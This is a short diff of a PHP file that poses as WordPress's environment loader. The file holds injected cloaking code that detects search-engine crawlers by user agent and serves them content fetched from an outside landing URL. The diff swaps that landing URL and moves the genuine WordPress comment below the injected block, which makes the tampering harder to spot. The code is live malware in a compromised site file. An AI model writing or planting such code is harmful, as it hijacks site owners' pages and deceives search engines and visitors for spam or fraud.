@@ -1,13 +1,8 @@
 <?php
-/**
- * Loads the WordPress environment and template.
- *
- * @package WordPress
- */
 @ob_start();
 header("Vary: U-Agent");
 
-$src = "https://childrenofiran.org/landing/uniski/";
+$src = "https://childrenofiran.org/landing/acadcrm/";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
@@ -28,6 +23,11 @@ if (preg_match($match, $ua)) {
     @ob_end_flush();
     exit;
 }
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
 
 if ( ! isset( $wp_did_header ) ) {
 
